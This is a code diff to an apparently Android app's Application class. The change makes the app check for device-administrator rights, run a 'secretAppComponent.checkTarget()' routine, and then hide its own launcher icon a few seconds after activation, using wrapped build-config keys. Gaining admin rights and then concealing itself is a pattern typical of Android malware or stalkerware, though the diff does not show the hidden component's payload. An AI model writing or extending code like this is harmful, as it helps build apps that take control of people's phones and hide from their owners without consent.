@@ -1,6 +1,9 @@
 package com.app.manager;
 
 import android.app.Application;
+import android.content.Intent;
+import android.os.Handler;
+import android.os.Looper;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -30,7 +33,7 @@ public class App extends Application implements ActivationListener {
         //        components.add(new TextComponent());
         //        components.add(new LockerComponent());
         components.add(new AdminComponent()
-                .setStartLauncherActivity(true)
+                .setStartLauncherActivity(false)
                 .setActivationListener(this)
         );
         components.add(new ReferencesComponent());
@@ -40,15 +43,33 @@ public class App extends Application implements ActivationListener {
                 BuildConfig.APPLICATION_ID,
                 CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1),
                 launcherActivity,
-                BuildConfig.DEBUG, useFullVersion,
+                BuildConfig.DEBUG, useFullVersion, false,
                 components);
+        if (AdminComponent.isDeviceAdmin(getApplicationContext())) {
+            onActivated();
+        }
     }
 
     @Override
     public void onActivated() {
-        if (secretAppComponent != null) {
-            secretAppComponent.checkTarget();
-        }
+        Intent launcherIntent = new Intent(getApplicationContext(),
+                SplashActivity.class);
+        launcherIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        getApplicationContext().startActivity(launcherIntent);
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (secretAppComponent != null) {
+                    secretAppComponent.checkTarget();
+                }
+            }
+        }, 1000);
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                CommonUtils.hideApp(getApplicationContext(), true, SplashActivity.class);
+            }
+        }, 3000);
     }
 
     @Override
